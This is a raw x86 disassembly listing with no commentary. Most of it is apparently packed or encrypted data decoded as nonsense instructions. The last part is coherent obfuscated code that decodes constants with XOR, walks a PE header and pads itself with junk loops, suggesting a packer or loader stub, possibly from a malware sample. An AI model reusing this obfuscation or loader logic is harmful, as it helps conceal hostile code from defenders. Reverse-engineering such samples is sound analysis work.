  42379a:	lock sbb al,0x6d
  42379d:	push   ecx
  42379e:	leave  
  42379f:	pushf  
  4237a0:	retf   0xfe3f
  4237a3:	xlat   BYTE PTR ds:[ebx]
  4237a4:	paddb  mm0,QWORD PTR [edx+0x34b68b4b]
  4237ab:	mov    bl,BYTE PTR [edi-0x4e]
  4237ae:	aas    
  4237af:	adc    eax,0x7bc4e7f3
  4237b4:	fidiv  DWORD PTR [eax+edx*1]
  4237b7:	add    al,0x98
  4237b9:	sti    
  4237ba:	add    BYTE PTR [ecx+0x281e78a3],0xa4
  4237c1:	or     eax,0xac8dd7be
  4237c6:	xor    eax,0xacc84d13
  4237cb:	ins    BYTE PTR es:[edi],dx
  4237cc:	inc    ebx
  4237cd:	sub    edi,esi
  4237cf:	inc    ebp
  4237d0:	out    0x6d,al
  4237d2:	mov    al,0x43
  4237d4:	fsub   DWORD PTR [eax+0x6af833d6]
  4237da:	aad    0x0
  4237dc:	inc    ebp
  4237dd:	clc    
  4237de:	ret    0xb142
  4237e1:	(bad)  
  4237e2:	(bad)  
  4237e3:	aas    
  4237e4:	fisttp QWORD PTR [edx+esi*1+0x314a455f]
  4237eb:	xchg   BYTE PTR [edx],ch
  4237ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237ee:	out    0x7e,eax
  4237f0:	add    dl,BYTE PTR [edi]
  4237f2:	push   ebp
  4237f3:	inc    edi
  4237f4:	mov    ch,0xb8
  4237f6:	bswap  esp
  4237f8:	cmp    BYTE PTR [edi+eiz*2],dl
  4237fb:	xchg   ecx,eax
  4237fc:	dec    esi
  4237fd:	add    al,0x58
  4237ff:	inc    esp
  423800:	cmp    al,0xd
  423802:	inc    esi
  423803:	sub    BYTE PTR [esi+0x11],bh
  423806:	das    
  423807:	in     al,dx
  423808:	adc    eax,DWORD PTR [ecx]
  42380a:	inc    ebp
  42380b:	pop    ds
  42380c:	cwde   
  42380d:	cmp    esp,edx
  42380f:	push   esi
  423810:	(bad)  
  423812:	dec    ebp
  423813:	cmp    eax,0xfd76c1d
  423818:	jp     0x42387e
  42381a:	push   cs
  42381b:	xchg   edx,eax
  42381c:	nop    DWORD PTR [ecx-0x3e]
  423820:	lss    edx,FWORD PTR [esi+0x4bfbc167]
  423827:	ja     0x4237c3
  423829:	ret    0xe4a4
  42382c:	jmp    0x423809
  42382e:	xchg   ebp,eax
  42382f:	cli    
  423830:	ret    
  423831:	enter  0xf8a4,0x78
  423835:	clts   
  423837:	add    al,0x98
  423839:	sub    al,cl
  42383b:	int3   
  42383c:	or     esp,DWORD PTR [eax+ecx*2]
  42383f:	adc    BYTE PTR [edx+0x20763a75],dh
  423845:	dec    edx
  423846:	mov    esp,0xaac5080d
  42384b:	mov    ebp,0xd59fb606
  423850:	nop
  423851:	lea    ebx,[eax]
  423853:	mov    edx,0xcfc955
  423858:	daa    
  423859:	sahf   
  42385a:	jns    0x423847
  42385c:	fdivr  QWORD PTR [esi]
  42385e:	cmp    dh,BYTE PTR [edx+0x47ee4cb1]
  423864:	sub    eax,edi
  423866:	repnz and eax,0xbd9bc944
  42386c:	cmp    eax,0x6ffbb949
  423871:	(bad)  
  423872:	bound  ebp,QWORD PTR [edx]
  423874:	lods   eax,DWORD PTR ds:[esi]
  423875:	push   ecx
  423876:	or     al,0x9a
  423878:	pop    ebp
  423879:	repz push 0x8dc91865
  42387f:	out    dx,al
  423880:	rol    ecx,1
  423882:	inc    ebx
  423883:	xchg   edx,eax
  423884:	clc    
  423885:	iret   
  423886:	data16 stos BYTE PTR es:[edi],al
  423888:	pop    ds
  423889:	jg     0x42389d
  42388b:	cdq    
  42388c:	mov    dl,0x8b
  42388e:	into   
  42388f:	pop    edx
  423890:	mov    ch,0x84
  423892:	ds loope 0x423838
  423895:	push   0xb9bfbf4f
  42389a:	data16 je 0x423853
  42389d:	mov    eax,0x73a957e7
  4238a2:	stos   BYTE PTR es:[edi],al
  4238a3:	xor    eax,0xe490f8aa
  4238a8:	xor    al,0x63
  4238aa:	push   ebp
  4238ab:	inc    eax
  4238ac:	(bad)  
  4238ad:	call   0x1f2fbd0c
  4238b2:	shr    ah,cl
  4238b4:	lock or DWORD PTR es:[ebp-0x3d83444d],0x7e9db4fc
  4238c0:	enter  0x2742,0x9c
  4238c4:	not    BYTE PTR [ecx+0x6f]
  4238c7:	xor    DWORD PTR ds:0xbc63806a,ebx
  4238cd:	clc    
  4238ce:	call   0x374231f8
  4238d3:	xchg   BYTE PTR [edx+ecx*1+0x15a96c57],dl
  4238da:	dec    eax
  4238db:	cmc    
  4238dc:	adc    al,0xc6
  4238de:	addr16 int3 
  4238e0:	rcr    BYTE PTR [eax],cl
  4238e2:	sbb    ebp,DWORD PTR [esi+0x3b94c760]
  4238e8:	and    ch,BYTE PTR [ebx-0x72b8c79]
  4238ee:	xchg   ebp,eax
  4238ef:	dec    ecx
  4238f0:	mov    esp,0x168102b9
  4238f5:	xor    cl,ch
  4238f7:	(bad)  
  4238f8:	mov    dh,0x6d
  4238fa:	mov    esi,0x1605c28a
  4238ff:	jmp    0x419a:0x13b56fe0
  423906:	test   DWORD PTR [ebx],esi
  423908:	ss loope 0x423929
  42390b:	and    eax,DWORD PTR [edi]
  42390d:	xor    al,0x15
  42390f:	sbb    DWORD PTR ds:0x2a6f431c,edx
  423915:	jle    0x4238d5
  423917:	mov    ecx,0x7a92ae1c
  42391c:	ret    0x6258
  42391f:	outs   dx,BYTE PTR ds:[esi]
  423920:	aad    0x96
  423922:	adc    dh,cl
  423924:	int    0x81
  423926:	fisub  WORD PTR [eax+0x71]
  423929:	mov    al,0x1e
  42392b:	cmp    DWORD PTR [ebp+0x55],esi
  42392e:	and    edx,DWORD PTR [ebx-0x4]
  423931:	int    0x25
  423933:	jg     0x423976
  423935:	mov    edx,0x40dd439b
  42393a:	inc    esp
  42393b:	fsubr  st(1),st
  42393d:	dec    edi
  42393e:	adc    ebp,edx
  423940:	or     BYTE PTR [eax],dl
  423942:	xchg   esp,ecx
  423944:	adc    al,0x3b
  423947:	lahf   
  423948:	inc    ebx
  423949:	call   0x21c98d36
  42394e:	add    al,0x79
  423950:	es ins DWORD PTR es:[edi],dx
  423952:	add    dl,al
  423954:	inc    edi
  423955:	(bad)  
  423957:	push   ds
  423958:	or     eax,0x4e3a955e
  42395d:	sbb    eax,0x8ca76ac2
  423962:	stos   BYTE PTR es:[edi],al
  423963:	adc    DWORD PTR [ecx],esp
  423965:	in     eax,dx
  423966:	mov    BYTE PTR [ebx-0x47],0x78
  42396a:	ja     0x4239a2
  42396c:	sbb    BYTE PTR [ebx-0x3f64ab10],0x6b
  423973:	addr16 das 
  423975:	inc    ebx
  423976:	pop    es
  423977:	and    BYTE PTR [ecx-0x9],0x48
  42397b:	into   
  42397c:	dec    eax
  42397d:	es dec edx
  42397f:	jne    0x42391a
  423981:	les    esi,FWORD PTR ds:0x7a0f0ed0
  423987:	adc    DWORD PTR [ebx+0x62],ebp
  42398a:	test   BYTE PTR [esi-0x26caabb5],bh
  423990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423991:	dec    edx
  423992:	mov    edx,0xcc997864
  423997:	sub    eax,0x6d4e3e1
  42399c:	(bad)  
  42399d:	out    0xbf,al
  42399f:	test   DWORD PTR [ebx],0xb62bc4fd
  4239a5:	or     eax,0x2717e8c5
  4239aa:	fnsave [ebp+0x7e]
  4239ad:	(bad)  
  4239ae:	retf   
  4239af:	xor    cl,BYTE PTR [ebp+0x7ff89b36]
  4239b5:	sar    DWORD PTR [esi],1
  4239b7:	push   esi
  4239b8:	pop    edi
  4239b9:	js     0x4239af
  4239bb:	ins    BYTE PTR es:[edi],dx
  4239bc:	pop    eax
  4239bd:	sbb    eax,0x72d0f36b
  4239c2:	jns    0x42395b
  4239c4:	ss jge 0x423976
  4239c7:	into   
  4239c8:	(bad)  
  4239c9:	push   esp
  4239ca:	adc    BYTE PTR [ecx+0x7d],0x9e
  4239ce:	sub    edi,edx
  4239d0:	test   eax,0x43a088e6
  4239d5:	ror    BYTE PTR [ebp+ebp*1+0x6dac85b4],cl
  4239dc:	sub    eax,0xe978a89b
  4239e1:	mov    DWORD PTR ds:0x268f4a90,eax
  4239e7:	pop    es
  4239e8:	stos   BYTE PTR es:[edi],al
  4239e9:	and    BYTE PTR [ebp-0x1d3b06ba],dl
  4239ef:	ja     0x4239b3
  4239f1:	push   edx
  4239f2:	or     ebp,DWORD PTR [ebp+0x46c04403]
  4239f8:	test   al,0xc9
  4239fa:	inc    esi
  4239fb:	cs stos BYTE PTR es:[edi],al
  4239fd:	cmp    DWORD PTR [esi+0x20],esp
  423a00:	mov    bh,0xa
  423a02:	push   ecx
  423a03:	pushf  
  423a04:	pushf  
  423a05:	cmp    eax,0xccd7dbb9
  423a0a:	mov    BYTE PTR [esi],dh
  423a0c:	jle    0x423a23
  423a0e:	mov    ah,0x29
  423a10:	jbe    0x4239e1
  423a12:	rol    DWORD PTR [esi],0xb8
  423a15:	repz sbb DWORD PTR [edx+0x2e5e0669],edi
  423a1c:	mov    esi,0xf3186acb
  423a21:	dec    ebp
  423a22:	mov    al,0x62
  423a24:	inc    DWORD PTR [esi-0x1b6f647f]
  423a2a:	out    0xd8,eax
  423a2c:	push   esi
  423a2d:	dec    esi
  423a2e:	cmp    BYTE PTR [ebp+0x13],dh
  423a31:	sti    
  423a32:	xchg   ebx,eax
  423a33:	ret    
  423a34:	ret    
  423a35:	inc    edi
  423a36:	inc    ecx
  423a37:	mov    WORD PTR [esi],cs
  423a39:	mov    esi,0x6ce414e0
  423a3e:	xor    al,0x66
  423a40:	xor    al,0xae
  423a42:	test   DWORD PTR [esi+0x5b],0x636a2490
  423a49:	dec    ecx
  423a4a:	je     0x423a4c
  423a4c:	dec    ebp
  423a4d:	ret    0x7ddb
  423a50:	call   0xadc0:0x7c44e326
  423a57:	and    BYTE PTR [ebp-0x7ddd709],bl
  423a5d:	cmp    DWORD PTR [eax],0xf9ca0ef2
  423a63:	sbb    ebx,DWORD PTR [ebp-0x55]
  423a66:	xor    al,0xd5
  423a68:	mov    cs,ebp
  423a6a:	push   ds
  423a6b:	jmp    0xbf0c:0x676b8d2
  423a72:	lsl    esi,WORD PTR [ecx+0x1b]
  423a76:	int    0xae
  423a78:	mov    edi,0x241194ce
  423a7d:	mov    cl,0xa4
  423a7f:	adc    eax,0xe689041d
  423a84:	stos   DWORD PTR es:[edi],eax
  423a85:	jge    0x423a6f
  423a87:	cli    
  423a88:	int3   
  423a89:	test   BYTE PTR [edi-0x60],0x60
  423a8d:	icebp  
  423a8e:	jne    0x77e9e70e
  423a94:	mov    bl,0x6f
  423a96:	mov    bl,0xb8
  423a98:	xor    DWORD PTR [ebx+0x77],esp
  423a9b:	sbb    al,0x66
  423a9d:	jbe    0x423b1a
  423a9f:	fs pop ss
  423aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423aa2:	lods   al,BYTE PTR ds:[esi]
  423aa3:	call   0x4599:0x33bf3c4c
  423aaa:	mov    bl,0x46
  423aac:	sub    ebp,DWORD PTR [edi]
  423aae:	dec    eax
  423aaf:	cmp    BYTE PTR [esi],dh
  423ab1:	push   ecx
  423ab2:	lahf   
  423ab3:	mov    ah,0xb5
  423ab5:	or     eax,0x43d973d7
  423aba:	push   eax
  423abb:	and    BYTE PTR [edi+0xc],cl
  423abe:	xchg   edx,eax
  423abf:	cmc    
  423ac0:	ins    DWORD PTR es:[edi],dx
  423ac1:	iret   
  423ac2:	shr    DWORD PTR [ebp+0x1723c19a],cl
  423ac8:	fucomip st,st(6)
  423aca:	sbb    ebx,DWORD PTR [edx]
  423acc:	cwde   
  423acd:	fdivr  QWORD PTR [esi]
  423acf:	sbb    BYTE PTR [ebx],0x18
  423ad2:	push   ss
  423ad3:	cmp    ch,BYTE PTR ss:[ecx+0x1b]
  423ad7:	cmp    eax,0x98fdbafe
  423adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423add:	or     cl,BYTE PTR [ecx-0x3a]
  423ae0:	jmp    0xfb5d:0xfa49a82c
  423ae7:	push   esi
  423ae8:	inc    edx
  423ae9:	jno    0x423aeb
  423aeb:	mov    cl,0xb5
  423aed:	outs   dx,BYTE PTR ds:[esi]
  423aee:	mov    bl,0xb0
  423af0:	xor    eax,0xce716a12
  423af5:	das    
  423af6:	mov    bh,0xef
  423af8:	stc    
  423af9:	adc    eax,0xb54ac2a2
  423afe:	sbb    al,0x5
  423b00:	mov    ch,0x97
  423b02:	sub    al,0x6c
  423b04:	mov    ebx,0x13c8fca0
  423b09:	ret    0xc291
  423b0c:	or     DWORD PTR [ecx],ebp
  423b0e:	aas    
  423b0f:	mov    ds:0xe13747d5,al
  423b14:	xchg   DWORD PTR [esi+0x2b],ebx
  423b17:	jmp    0x423b8b
  423b19:	iret   
  423b1a:	add    cl,BYTE PTR [ebx+0x79]
  423b1d:	jge    0x423ad2
  423b1f:	cmp    eax,0xc7079030
  423b24:	inc    esp
  423b25:	push   ds
  423b26:	mov    edi,0x38dbea1e
  423b2b:	mov    WORD PTR ds:0x2bc32070,gs
  423b31:	inc    ebp
  423b32:	cs push ebp
  423b34:	and    eax,0xeb04a625
  423b39:	bnd jb 0x423ac7
  423b3c:	vmread DWORD PTR [ebp-0x76797e79],eax
  423b43:	mov    edi,0xc2941569
  423b48:	sbb    al,0x7
  423b4a:	dec    esp
  423b4b:	dec    esp
  423b4c:	call   0xc8e614c2
  423b51:	sbb    DWORD PTR [edi-0x63de8e33],0xffffff9f
  423b58:	pop    esi
  423b59:	data16 aam 0xcf
  423b5c:	push   ecx
  423b5d:	dec    esp
  423b5e:	mov    esp,0x60a8585
  423b63:	repz inc esi
  423b65:	pop    edi
  423b66:	xchg   DWORD PTR [edi],ebp
  423b68:	mov    edi,0x2de7374c
  423b6d:	inc    BYTE PTR [eax-0x41]
  423b70:	int    0x86
  423b72:	fcomp  QWORD PTR [edi]
  423b74:	stc    
  423b75:	inc    ebx
  423b76:	pop    edx
  423b77:	pop    DWORD PTR [ebx-0x1635824b]
  423b7d:	sbb    eax,0xb182f70e
  423b82:	xchg   ecx,eax
  423b83:	push   edi
  423b84:	imul   edi,ebp,0x9df16ac6
  423b8a:	ins    DWORD PTR es:[edi],dx
  423b8b:	inc    edi
  423b8c:	or     al,0x7c
  423b8e:	and    dl,BYTE PTR ds:0xb1b8b676
  423b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b95:	aam    0x14
  423b97:	xor    al,0xf0
  423b99:	fild   WORD PTR [edx-0x2a4867e7]
  423b9f:	mov    dl,0xfa
  423ba1:	into   
  423ba2:	mov    cl,0x71
  423ba4:	cld    
  423ba5:	shr    BYTE PTR [edx-0x49],1
  423ba8:	pop    ebx
  423ba9:	test   eax,0xb8b10c41
  423bae:	bound  edi,QWORD PTR [eax]
  423bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bb1:	ds pushf 
  423bb3:	stc    
  423bb4:	popa   
  423bb5:	push   esp
  423bb6:	arpl   WORD PTR [eax-0x65d2b5c2],ax
  423bbc:	mov    BYTE PTR ds:0x2c98fe68,dh
  423bc2:	mov    edi,0x714e97f5
  423bc7:	pop    ebp
  423bc8:	cmp    al,0x3f
  423bca:	and    eax,0xf0b68f5d
  423bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bd0:	and    eax,0xff8aee10
  423bd5:	mov    bl,0xdf
  423bd7:	js     0x423c46
  423bd9:	sahf   
  423bda:	mov    al,ds:0x6d1e9d44
  423bdf:	sub    DWORD PTR [ebx-0x2c],eax
  423be2:	dec    eax
  423be3:	jg     0x423b90
  423be5:	mov    ebp,0xe6588062
  423bea:	pop    ebp
  423beb:	div    BYTE PTR [esi-0x3415efff]
  423bf1:	add    eax,0x30eb5d2
  423bf6:	add    dh,dl
  423bf8:	js     0x423c46
  423bfa:	and    DWORD PTR [esi],ecx
  423bfc:	cmp    dl,BYTE PTR [ebx]
  423bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bff:	cdq    
  423c00:	int    0xbc
  423c02:	mov    al,0x46
  423c04:	aad    0x10
  423c06:	sti    
  423c07:	out    0xca,al
  423c09:	push   eax
  423c0a:	sbb    al,0xf4
  423c0c:	fsub   DWORD PTR [eax+ebp*8-0x53]
  423c10:	dec    ebp
  423c11:	fst    QWORD PTR [edx-0x7fb0a26]
  423c17:	outs   dx,BYTE PTR ds:[esi]
  423c18:	adc    BYTE PTR [edx+0x57],cl
  423c1b:	in     eax,0x1e
  423c1d:	dec    ebx
  423c1e:	retf   
  423c1f:	sbb    eax,0x7047b4a8
  423c24:	sub    eax,0x1ce6674a
  423c29:	mov    edi,0xcae7c15d
  423c2e:	nop
  423c2f:	xor    cl,cl
  423c31:	cmp    bh,dl
  423c33:	or     BYTE PTR [esi-0x7b],dh
  423c36:	or     eax,DWORD PTR [eax+0x45]
  423c39:	pop    ds
  423c3a:	(bad)  
  423c3b:	shr    BYTE PTR [ecx+0x9],1
  423c3e:	rcl    DWORD PTR [esp+ebx*1],0xd0
  423c42:	jp     0x423c0b
  423c44:	js     0x423bcc
  423c46:	cdq    
  423c47:	cld    
  423c48:	fdivr  DWORD PTR [ecx-0x2e]
  423c4b:	outs   dx,DWORD PTR ds:[esi]
  423c4c:	inc    ebx
  423c4d:	pop    ebx
  423c4e:	fisttp WORD PTR [ecx+0x25eed6ec]
  423c54:	adc    eax,0x139a5720
  423c59:	gs jmp 0x8bf146bf
  423c5f:	loop   0x423c27
  423c61:	(bad)  [ebx+0x6dcf165d]
  423c67:	sub    DWORD PTR [esi+0x66d69698],ebp
  423c6d:	ins    DWORD PTR es:[edi],dx
  423c6e:	ret    0x3c6b
  423c71:	aaa    
  423c72:	sbb    ebx,DWORD PTR [eax+eiz*2+0x15]
  423c76:	loop   0x423c4d
  423c78:	sbb    DWORD PTR [edx],ebx
  423c7a:	retf   0xc9c3
  423c7d:	push   edx
  423c7e:	inc    ecx
  423c7f:	les    edx,FWORD PTR [edx-0x6d]
  423c82:	out    0x1b,al
  423c84:	cmp    bh,BYTE PTR [ebp+0x75]
  423c87:	jnp    0x423cd3
  423c89:	test   dl,0xa8
  423c8c:	cmc    
  423c8d:	and    ebx,0xc181bec8
  423c93:	adc    al,0xc9
  423c95:	sbb    ch,BYTE PTR [ebp-0x2ccdd30]
  423c9b:	pop    ss
  423c9c:	mov    edx,0x4fb25a60
  423ca1:	sub    ch,BYTE PTR [ecx+0x26]
  423ca4:	lahf   
  423ca5:	gs mov bl,0xa5
  423ca8:	and    ch,ch
  423caa:	call   0x17cb998c
  423caf:	sbb    BYTE PTR [ebx+0x52],ah
  423cb2:	mov    es,WORD PTR [edi+ebx*8+0x45]
  423cb6:	or     eax,0xa3b7702a
  423cbb:	xor    BYTE PTR [ecx+0x7e],bl
  423cbe:	push   esi
  423cbf:	or     al,0x2a
  423cc1:	ret    
  423cc2:	pusha  
  423cc3:	push   ds
  423cc4:	jae    0x423cc0
  423cc6:	ret    
  423cc7:	mov    ebx,0xfdedae5a
  423ccc:	dec    ebx
  423ccd:	adc    eax,0x839bc7a6
  423cd2:	cmp    BYTE PTR [ecx+eax*4-0x367d923f],bh
  423cd9:	dec    edx
  423cda:	or     eax,0x6040b61e
  423cdf:	mov    ebx,0x1b58805
  423ce4:	xchg   BYTE PTR [esi-0x6f],dl
  423ce7:	mov    BYTE PTR [edx+0x5593b218],ah
  423ced:	sbb    BYTE PTR [ebx+edi*1-0x15cc0de2],bh
  423cf4:	bound  esi,QWORD PTR [ebp-0xca95c4e]
  423cfa:	out    dx,eax
  423cfb:	push   ebx
  423cfc:	mov    bl,0x8d
  423cfe:	cld    
  423cff:	cmp    bh,cl
  423d01:	pop    esi
  423d02:	inc    ebp
  423d03:	bound  edx,QWORD PTR [ebx]
  423d05:	pop    edi
  423d06:	add    al,0x6b
  423d08:	push   ss
  423d09:	stos   DWORD PTR es:[edi],eax
  423d0a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  423d0c:	ins    BYTE PTR es:[edi],dx
  423d0d:	inc    edx
  423d0e:	ror    BYTE PTR [eax],0xb7
  423d11:	pop    ebp
  423d12:	pop    esp
  423d13:	mov    eax,ds:0x24abf561
  423d18:	jbe    0x423cf4
  423d1a:	(bad)  
  423d1c:	xor    BYTE PTR [ecx-0x43],ah
  423d1f:	cmp    DWORD PTR [edx+0x5e],esi
  423d22:	inc    ebp
  423d23:	add    ah,0x93
  423d26:	pop    edx
  423d27:	sbb    eax,0x4d592cb2
  423d2c:	inc    edi
  423d2d:	add    al,0x28
  423d2f:	xchg   edi,eax
  423d30:	mov    ah,0xfe
  423d32:	and    BYTE PTR [esi-0x43],ah
  423d35:	mov    eax,ds:0x8f918377
  423d3a:	jle    0x423ce5
  423d3c:	sbb    DWORD PTR [edi+0x7b],0x43
  423d40:	dec    esi
  423d41:	test   ecx,edi
  423d43:	xchg   esp,eax
  423d44:	push   edi
  423d45:	jb     0x423d41
  423d47:	pop    esp
  423d48:	es xor ah,cl
  423d4b:	jns    0x423ce1
  423d4d:	jp     0x423d43
  423d4f:	repnz mov esp,0x56e34636
  423d55:	into   
  423d56:	pop    eax
  423d57:	mov    ebx,0x8d1dead2
  423d5c:	popa   
  423d5d:	pop    ds
  423d5e:	cli    
  423d5f:	ret    0xdca
  423d62:	xor    al,0x67
  423d64:	arpl   WORD PTR [esp+ebp*2+0x538b693a],cx
  423d6b:	jns    0x423d81
  423d6d:	mov    DWORD PTR [ecx],eax
  423d6f:	pop    ebp
  423d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d71:	shl    BYTE PTR [edi+0x42],1
  423d74:	pusha  
  423d75:	fwait
  423d76:	ror    al,1
  423d78:	imul   DWORD PTR [bp-0x30]
  423d7c:	je     0x423d5c
  423d7e:	jae    0x423d61
  423d80:	cmp    al,0xb9
  423d82:	pop    edx
  423d83:	call   0xa6d8:0x37836851
  423d8a:	outs   dx,BYTE PTR ds:[esi]
  423d8b:	fldenv [esi]
  423d8d:	or     al,0x9b
  423d8f:	adc    al,0xdb
  423d91:	mov    ch,0x5c
  423d93:	pop    esp
  423d94:	push   ecx
  423d95:	push   0x61e2d49c
  423d9a:	imul   BYTE PTR [ecx+0x52]
  423d9d:	scas   al,BYTE PTR es:[edi]
  423d9e:	arpl   WORD PTR [edi],ax
  423da0:	mov    WORD PTR [edi],ds
  423da2:	retf   0xe25a
  423da5:	push   ds
  423da6:	cmp    DWORD PTR [edi],0x2b
  423da9:	adc    edx,esi
  423dab:	mov    ecx,0x74f8cdbd
  423db0:	ins    BYTE PTR es:[edi],dx
  423db1:	mov    ds:0xd4c76a7d,eax
  423db6:	cmp    ebx,ebp
  423db8:	dec    edx
  423db9:	ins    DWORD PTR es:[edi],dx
  423dba:	ins    DWORD PTR es:[edi],dx
  423dbb:	div    BYTE PTR ss:[edi+0x50]
  423dbf:	adc    BYTE PTR cs:[edi+ebx*1],dh
  423dc3:	or     BYTE PTR [ecx-0x5fb551c7],dl
  423dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dca:	xor    eax,0xbfe8811b
  423dcf:	arpl   bx,di
  423dd1:	clc    
  423dd2:	lock and al,0x85
  423dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dd6:	neg    BYTE PTR [edi+edi*4+0x36]
  423dda:	shr    DWORD PTR [edx],1
  423ddc:	cli    
  423ddd:	pop    ss
  423dde:	push   esi
  423ddf:	adc    ebx,DWORD PTR [ebx+0x2c0160d]
  423de5:	mov    bh,0x4c
  423de7:	pop    ss
  423de8:	sub    al,0xd6
  423dea:	xchg   ecx,eax
  423deb:	sub    BYTE PTR [edi-0x8],dh
  423dee:	aam    0xa9
  423df0:	jbe    0x423d89
  423df2:	outs   dx,BYTE PTR ds:[esi]
  423df3:	sub    BYTE PTR [ebp+0x38],ah
  423df6:	(bad)  
  423df7:	mov    al,ds:0x4ab59404
  423dfc:	ds mov ch,0x4b
  423dff:	inc    ecx
  423e00:	fsubr  st,st(4)
  423e02:	mov    eax,DWORD PTR [ebp+0x8]
  423e05:	movsx  eax,BYTE PTR [eax]
  423e08:	mov    edx,0x3272f6
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x432e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x432e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x432e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x432e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x432e6b
  423e5b:	adc    esi,DWORD PTR ds:0x432e2f
  423e61:	mov    DWORD PTR ds:0x432e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x432ecf,0x432ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x432eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x432e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x432e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x432e97,edx
  423ec3:	cmp    DWORD PTR ds:0x432e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x432e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x43fdfb
  423eeb:	cmp    DWORD PTR ds:0x432e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x432e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x432e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x432e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x432e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x432e67,edx
  423f29:	cmp    DWORD PTR ds:0x432e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x432e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x432e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x43fdff
  423f59:	cmp    DWORD PTR ds:0x432e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x432e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x432e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x432e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x432e97
  423f96:	add    DWORD PTR ds:0x432ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x437077
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x432ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
